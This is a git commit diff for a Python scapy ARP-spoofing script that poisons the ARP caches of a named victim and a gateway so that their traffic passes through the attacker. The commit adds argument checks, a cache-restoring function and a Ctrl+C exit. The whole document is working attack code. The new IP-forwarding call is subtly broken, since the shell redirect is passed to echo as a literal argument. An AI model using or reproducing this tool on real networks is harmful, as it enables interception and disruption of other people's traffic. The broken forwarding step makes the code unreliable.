6384b057ce73b1aecfde09d4373437446eef0de4
Miles <milesjtn@gmail.com>
2019-07-11 11:05:26 +1000

    arp spoofer now handles input exceptions, restores ARP table and exits gracefully

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -3,13 +3,18 @@ import scapy.all as scapy
 import argparse
 import time
 import subprocess
+import sys
 
 def get_mac(dest_ip):
     arp_request = scapy.ARP(pdst=dest_ip)
     broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast_packet = broadcast_request / arp_request
     answered_packets = scapy.srp(arp_request_broadcast_packet, timeout=1, verbose=False)[0]
-    return answered_packets[0][1].hwsrc
+    try:
+        return answered_packets[0][1].hwsrc
+    except IndexError:
+        print("[-] Host " + str(dest_ip) + " is not up, or that IP does not exist on current subnet")
+        sys.exit(0)
 
 """
 :param target_ip: the IP address of the victim you are posing at the router to
@@ -23,7 +28,11 @@ def spoof_arp(target_ip, source_ip):
 
 
 
-#def restore_arp():
+def restore_arp(target_ip, gateway_ip):
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    scapy.send(arp_response_packet, verbose=False)
 
 
 
@@ -31,24 +40,49 @@ def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target_ip", help="the IP address of the target machine")
     parser.add_argument("-s", "--source", dest="source_ip", help="the IP address of the network gateway "
-                                                                 "you are impersonating")
+                                                            "you are impersonating")
     arguments = parser.parse_args()
-    return arguments
+    if not arguments.target_ip:
+        parser.error("[-] please specify a target IP address")
+    elif not arguments.source_ip:
+        parser.error("[-] please specify a source IP address")
+    else:
+        return arguments
 
 
 def execute():
-    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
     arguments = get_arguments()
+    target_mac = get_mac(arguments.target_ip)
+    source_mac = get_mac(arguments.source_ip)
+    subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
     packet_count = 0
-    print("Current target:" + "\t\t" + str(arguments.target_ip) + "\t" + str(get_mac(arguments.target_ip)))
-    print("Current gateway:" + "\t\t" + str(arguments.source_ip) + "\t" + str(get_mac(arguments.source_ip)))
+
+    print("\n")
+    print("               " + "\t\t" + "IP address  " + "\t" + "MAC address")
+    print("\n")
+    print("Current target:" + "\t\t" + str(arguments.target_ip) + "\t" + str(target_mac))
+    print("Current source:" + "\t\t" + str(arguments.source_ip) + "\t" + str(source_mac))
+
     print("\n")
     while True:
-        spoof_arp(arguments.target_ip, arguments.source_ip)
-        spoof_arp(arguments.source_ip, arguments.target_ip)
-        time.sleep(2)
-        print("\r[+] Packets sent: " + str(packet_count), end="")
-        packet_count += 2
+        try:
+            spoof_arp(arguments.target_ip, arguments.source_ip)
+            spoof_arp(arguments.source_ip, arguments.target_ip)
+            time.sleep(2)
+            print("\r[+] Packets sent: " + str(packet_count), end="")
+            packet_count += 2
+        except KeyboardInterrupt:
+            restore_arp(arguments.target_ip, arguments.source_ip)
+            restore_arp(arguments.source_ip, arguments.target_ip)
+            print("[+] CTRL + C detected, exiting and restoring ARP configuration")
+            sys.exit(0)
+
 
 
 execute()
+
+#things to add:
+#restore arp
+#IP range
+#exception handling for ips outside of subnet
+#graceful exit
